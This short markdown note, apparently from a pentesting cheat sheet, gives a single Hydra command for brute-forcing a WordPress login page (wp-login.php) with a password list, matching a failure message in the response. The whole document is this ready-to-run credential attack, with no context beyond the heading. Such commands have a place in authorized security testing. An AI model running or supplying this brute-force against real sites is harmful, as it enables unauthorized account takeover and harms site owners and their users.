# Using Hydra for web brute force

## Wordpress login page

```
hydra -l 'user' -P ./pwdlist.lst domain.com -s 80 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:The Password"
```
